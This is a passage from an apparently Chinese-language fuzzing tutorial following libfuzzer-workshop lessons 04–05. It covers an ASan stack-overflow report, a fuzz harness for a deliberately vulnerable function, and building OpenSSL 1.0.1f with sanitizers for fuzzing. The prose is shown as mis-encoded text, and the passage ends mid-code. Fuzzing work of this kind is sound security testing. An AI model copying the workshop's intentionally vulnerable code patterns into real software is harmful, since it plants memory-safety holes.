/home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x7fd1b4bf6bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">14</span> <span class="number">0x41f599</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/second_fuzzer+<span class="number">0x41f599</span>)</span><br><span class="line"></span><br><span class="line">Address <span class="number">0x7fff31422548</span> is located in stack of thread T0 at offset <span class="number">1128</span> in frame</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59b4af</span> in VulnerableFunction2(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">42</span></span><br><span class="line"></span><br><span class="line">  This frame has <span class="number">3</span> object(s):</span><br><span class="line">    [<span class="number">32</span>, <span class="number">64</span>) <span class="string">&#x27;header&#x27;</span> (line <span class="number">46</span>)</span><br><span class="line">    [<span class="number">96</span>, <span class="number">97</span>) <span class="string">&#x27;ref.tmp&#x27;</span> (line <span class="number">46</span>)</span><br><span class="line">    [<span class="number">112</span>, <span class="number">1128</span>) <span class="string">&#x27;body&#x27;</span> (line <span class="number">48</span>) &lt;== Memory access at offset <span class="number">1128</span> overflows this variable</span><br><span class="line">HINT: this may be a <span class="literal">false</span> positive <span class="keyword">if</span> your program uses some custom stack unwind mechanism, swapcontext or vfork</span><br><span class="line">      (longjmp and C++ exceptions *are* supported)</span><br><span class="line">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:<span class="number">30</span> in __asan_memmove</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x10006627c450</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c460</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c470</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c480</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c490</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x10006627c4a0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[f3]f3 f3 f3 f3 f3 f3</span><br><span class="line">  <span class="number">0x10006627c4b0</span>: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4c0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4d0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> f1 f1 f1 f1 <span class="number">02</span> f3 f3 f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4f0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">10468</span>==ABORTING</span><br><span class="line">MS: <span class="number">4</span> ChangeBinInt-CrossOver-ChangeByte-EraseBytes-; base unit: e63bf1b07c6950248bb14fe74c3a84f06c711b15</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash-a42cbe2ff7331f281ef213e54919e8cd932883bd</span><br></pre></td></tr></table></figure><p>ç›¸ä¿¡å¤§å®¶å·²ç»ä¸å†é™Œç”Ÿäº†ï¼Œå®šä½é”™è¯¯ä½äº<code>#5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3</code><br>å³<code>  std::copy(data, data + size, body.data());</code>ï¼Œè¯¥å¥é€ æˆäº†stack_overflowï¼ŒåŸå› åœ¨äºvectorç±»å‹çš„bodyçš„å¤§å°ä¸º1024 - sizeof(kMagicHeader)ï¼Œè€Œåœ¨copyæ—¶çš„dataçš„sizeçš„é™åˆ¶æ¡ä»¶æ˜¯<code>size &gt; kMaxPacketLen(1024)</code>ï¼Œä»è€Œé€ æˆäº†ç¼“å†²åŒºæº¢å‡ºã€‚</p><p>å¦‚æœæˆ‘ä»¬å†™æ­»flagä¸ºfalseçš„è¯å°±å¯èƒ½ä¼šè·‘å¾ˆä¹…ï¼Œä¹Ÿè·‘ä¸å‡ºæ¥crashã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨å¥—ç”¨æ¨¡æ¿æ—¶è¦ç»“åˆå‡½æ•°çš„é€»è¾‘ï¼Œä½¿å¾—fuzzçš„æ¥å£è®¾è®¡çš„æ›´åŠ åˆç†ï¼Œä»è€Œå¢åŠ fuzzçš„æ•ˆç‡ã€‚</p><p>ç»§ç»­ç»§ç»­VulnerableFunction3:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="built_in">std</span>::<span class="type">size_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸2ä¸åŒçš„åœ°æ–¹å°±æ˜¯å¯¹flagè¿›è¡Œäº†&amp; kZn2016VerifyHashFlagçš„è®¡ç®—ï¼Œè¿™ç§å…¶å®æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºä½¿å¾—<code>flags &amp; kZn2016VerifyHashFlag</code>ä¸ºtrue&#x2F;falseçš„è¾“å…¥ï¼Œå¹¶æ¨¡ä»¿second_fuzzeré‚£æ ·å†™ä¸ªå¾ªç¯ï¼Œè¿™æ ·å°±å’Œ2æ²¡å·®äº†ã€‚<br>ä½†è¿™é‡Œworkshopæä¾›äº†ä¸€ä¸ªä¸åŒçš„æ–¹æ³•ï¼š<code>In this case, we can get some randomization of flags values using data provided by libFuzzer:</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">data_string</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size)</span>;</span><br><span class="line">  <span class="keyword">auto</span> data_hash = <span class="built_in">std</span>::hash&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;()(data_string);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="type">size_t</span> flags = static_cast&lt;<span class="type">size_t</span>&gt;(data_hash);</span><br><span class="line">  VulnerableFunction3(data, size, flags);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨äº†libfuzzeræä¾›çš„éšæœºåŒ–æ–¹æ³•ä½¿å¾—æˆ‘ä»¬çš„è¾“å…¥flagä¸ºéšæœºæ•°ï¼Œä»è€Œ<code>flags &amp; kZn2016VerifyHashFlag</code>çš„ç»“æœä¹ŸéšæœºåŒ–ã€‚åœ¨æ¬¡æ•°è¶³å¤Ÿå¤šçš„æƒ…å†µä¸‹falseå’Œtrueçš„æƒ…å†µå°†è¶‹äºåŒä¸º50%ã€‚</p><h6 id="æ¥ä¸‹æ¥çœ‹lesson05ï¼š"><a href="#æ¥ä¸‹æ¥çœ‹lesson05ï¼š" class="headerlink" title="æ¥ä¸‹æ¥çœ‹lesson05ï¼š"></a>æ¥ä¸‹æ¥çœ‹lesson05ï¼š</h6><p>è¿™æ¬¡çš„ç›®æ ‡å’Œlesson04æœ‰æ‰€ä¸åŒï¼Œlesson04ä¸­æˆ‘ä»¬é’ˆå¯¹.hå‡½æ•°åº“ä¸­çš„å‡½æ•°è¿›è¡Œfuzzï¼Œè€Œlibfuzzerçš„å¨åŠ›è¿œä¸æ­¢äºæ­¤ï¼Œå®ƒè¿˜å¯ä»¥å¯¹å¤§å‹å¼€æºåº“è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚åœ¨æºç ç¼–è¯‘å¼€æºåº“æ—¶é€‰æ‹©åˆé€‚çš„é€‰é¡¹ä»¥åŠå°†libfuzzerä¸å¼€æºåº“é“¾æ¥åœ¨ä¸€èµ·ä»¥è¿›è¡Œfuzzï¼Œè¿™äº›ç»†èŠ‚å°†åœ¨è¯¥lesson05ä½“ç°ã€‚</p><p>é¦–å…ˆè§£åŒ…<code>tar xzf openssl1.0.1f.tgz</code>ã€‚æ¥ç€æ‰§è¡Œ<code>./config</code>ç”Ÿæˆmakefileã€‚ä¹‹åï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">make CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot; -j$(nproc)</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ¡æŒ‡ä»¤å…¶å®å¹¶ä¸å¤ªè§„èŒƒï¼Œå°†ç¼–è¾‘å™¨ä»¥å¤–çš„å…¶ä»–å‚æ•°ä¹Ÿä¸€è‚¡è„‘å†™åˆ°CCå˜é‡é‡Œäº†ã€‚clangåçš„å‚æ•°æœ¬åº”è¯¥æ˜¯ç”±CFLAGSæˆ–CXXFLAGSæŒ‡å®šçš„ã€‚è§£é‡Šä¸€ä¸‹é€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-02 æŒ‡å®šä¼˜å…ˆçº§åˆ«</span><br><span class="line">-g å¸¦æœ‰è°ƒè¯•ç¬¦å·æ¥ç¼–è¯‘</span><br><span class="line">-fno-omit-frame-pointer å¯¹äºä¸éœ€è¦æ ˆæŒ‡é’ˆçš„å‡½æ•°å°±ä¸åœ¨å¯„å­˜å™¨ä¸­ä¿å­˜æŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥å¿½ç•¥å­˜å‚¨å’Œæ£€ç´¢åœ°å€çš„ä»£ç ï¼ŒåŒæ—¶å¯¹è®¸å¤šå‡½æ•°æä¾›ä¸€ä¸ªé¢å¤–çš„å¯„å­˜å™¨ã€‚æ‰€æœ‰â€-Oâ€çº§åˆ«éƒ½æ‰“å¼€å®ƒï¼Œä½†ä»…åœ¨è°ƒè¯•å™¨å¯ä»¥ä¸ä¾é æ ˆæŒ‡é’ˆè¿è¡Œæ—¶æ‰æœ‰æ•ˆã€‚åœ¨AMD64å¹³å°ä¸Šæ­¤é€‰é¡¹é»˜è®¤æ‰“å¼€ï¼Œä½†æ˜¯åœ¨x86å¹³å°ä¸Šåˆ™é»˜è®¤å…³é—­ã€‚å»ºè®®æ˜¾å¼çš„è®¾ç½®å®ƒã€‚</span><br><span class="line">-fsanitize æŒ‡å®šsanitize</span><br></pre></td></tr></table></figure><p>è¿™äº›å‚æ•°çš„æŒ‡å®šæ˜¯è‡³å…³é‡è¦çš„ï¼Œå®ƒä¼šå½±å“åˆ°ä¹‹åå¼€æºåº“ä¸libfuzzerçš„é“¾æ¥ä»¥åŠfuzzçš„æ•ˆç‡ã€‚å¦‚æœä¸è®¾ç½®è¿™äº›ç¼–è¯‘é€‰é¡¹ç›´æ¥makeçš„è¯fuzzçš„æ•ˆç‡å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">05</span> git:(master) âœ— ./openssl_fuzzer2</span><br><span class="line">INFO: Seed: <span class="number">1865248494</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">10</span> inline <span class="number">8</span>-bit counters): <span class="number">10</span> [<span class="number">0x96c950</span>, <span class="number">0x96c95a</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">10</span> PCs): <span class="number">10</span> [<span class="number">0x6d56d0</span>,<span class="number">0x6d5770</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb</span><br><span class="line">#<span class="number">131072</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">1300</span> exec/s: <span class="number">43690</span> rss: <span class="number">388</span>Mb</span><br><span class="line">#<span class="number">262144</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">2611</span> exec/s: <span class="number">43690</span> rss: <span class="number">397</span>Mb</span><br><span class="line">#<span class="number">524288</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">37449</span> rss: <span class="number">411</span>Mb</span><br><span class="line">#<span class="number">1048576</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">34952</span> rss: <span class="number">411</span>Mb</span><br><span class="line">#<span class="number">2097152</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">32768</span> rss: <span class="number">411</span>Mb</span><br></pre></td></tr></table></figure><p>è¿™è·¯å¾„è¦†ç›–ç‡å¤ªæ„Ÿäººï¼Œå…¶ä¸­çš„é‡è¦åŸå› å°±åœ¨äºç¼–è¯‘å¼€æºåº“æ—¶çš„é€‰é¡¹è®¾ç½®ã€‚<br>è®¾ç½®ç¼–è¯‘é€‰é¡¹åçš„fuzzæ•ˆæœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">INFO: Seed: <span class="number">2565779026</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">35878</span> inline <span class="number">8</span>-bit counters): <span class="number">35878</span> [<span class="number">0xcd8590</span>, <span class="number">0xce11b6</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">35878</span> PCs): <span class="number">35878</span> [<span class="number">0x954da8</span>,<span class="number">0x9e1008</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">410</span> ft: <span class="number">411</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">36</span>Mb</span><br><span class="line">#<span class="number">112</span>NEW    cov: <span class="number">413</span> ft: <span class="number">416</span> corp: <span class="number">2</span>/<span class="number">2</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">42</span>Mb L: <span class="number">1</span>/<span class="number">1</span> MS: <span class="number">5</span> ChangeBit-ChangeBinInt-ChangeByte-InsertByte-EraseBytes-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x65f0a0</span> in ERR_put_error /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/err/err.c:<span class="number">708</span></span><br><span class="line">#<span class="number">319</span>NEW    cov: <span class="number">420</span> ft: <span class="number">448</span> corp: <span class="number">3</span>/<span class="number">8</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">51</span>Mb L: <span class="number">6</span>/<span class="number">6</span> MS: <span class="number">2</span> ShuffleBytes-CrossOver-</span><br><span class="line">#<span class="number">327</span>REDUCE cov: <span class="number">420</span> ft: <span class="number">448</span> corp: <span class="number">3</span>/<span class="number">7</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">51</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">3</span> ChangeByte-EraseBytes-CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">2</span>]: <span class="number">0x562a40</span> in tls1_enc /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_enc.c:<span class="number">685</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">2</span>]: <span class="number">0x67e1d0</span> in EVP_MD_CTX_md /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/evp/evp_lib.c:<span class="number">282</span></span><br><span class="line">#<span class="number">454</span>REDUCE cov: <span class="number">431</span> ft: <span class="number">467</span> corp: <span class="number">4</span>/<span class="number">12</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">57</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">2</span> ShuffleBytes-CMP- DE: <span class="string">&quot;\xfd\x03\x00\x00&quot;</span>-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">6</span>]: <span class="number">0x5663d0</span> in tls1_alert_code /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_enc.c:<span class="number">1214</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">6</span>]: <span class="number">0x5c6560</span> in do_ssl3_write /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_pkt.c:<span class="number">634</span></span><br><span class="line">#<span class="number">470</span>NEW    cov: <span class="number">465</span> ft: <span class="number">514</span> corp: <span class="number">5</span>/<span class="number">17</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">472</span>REDUCE cov: <span class="number">465</span> ft: <span class="number">521</span> corp: <span class="number">6</span>/<span class="number">23</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">6</span>/<span class="number">6</span> MS: <span class="number">2</span> CrossOver-CrossOver-</span><br><span class="line">#<span class="number">475</span>NEW    cov: <span class="number">467</span> ft: <span class="number">523</span> corp: <span class="number">7</span>/<span class="number">28</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">5</span>/<span class="number">6</span> MS: <span class="number">3</span> PersAutoDict-ChangeByte-ShuffleBytes- DE: <span class="string">&quot;\xfd\x03\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">1025</span>NEW    cov: <span class="number">467</span> ft: <span class="number">526</span> corp: <span class="number">8</span>/<span class="number">39</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">81</span>Mb L: <span class="number">11</span>/<span class="number">11</span> MS: <span class="number">5</span> CopyPart-ShuffleBytes-CrossOver-ShuffleBytes-ChangeBinInt-</span><br><span class="line">#<span class="number">1097</span>NEW    cov: <span class="number">474</span> ft: <span class="number">549</span> corp: <span class="number">9</span>/<span class="number">49</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">84</span>Mb L: <span class="number">10</span>/<span class="number">11</span> MS: <span class="number">2</span> ChangeBit-CopyPart-</span><br><span class="line">#<span class="number">1293</span>REDUCE cov: <span class="number">474</span> ft: <span class="number">549</span> corp: <span class="number">9</span>/<span class="number">48</span>b lim: <span class="number">11</span> exec/s: <span class="number">0</span> rss: <span class="number">92</span>Mb L: <span class="number">10</span>/<span class="number">10</span> MS: <span class="number">1</span> EraseBytes-</span><br></pre></td></tr></table></figure><p>é€‰æ‹©åˆé€‚çš„ç¼–è¯‘å™¨å’Œç¼–è¯‘é€‰é¡¹ï¼Œå®Œæˆå¯¹è¯¥åº“çš„æºç ç¼–è¯‘ï¼Œç”Ÿæˆ.aæ–‡ä»¶ã€‚æ¥ä¸‹æ¥å°±è¦ç ”ç©¶ç¼–å†™fuzzeræ¥å£å‡½æ•°äº†ã€‚<br>workshopæä¾›äº†openssl_fuzzer.ccï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CERT_PATH</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CERT_PATH</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">SSL_CTX *<span class="title function_">Init</span><span class="params">()</span> &#123;</span><br><span class="line">  SSL_library_init();</span><br><span class="line">  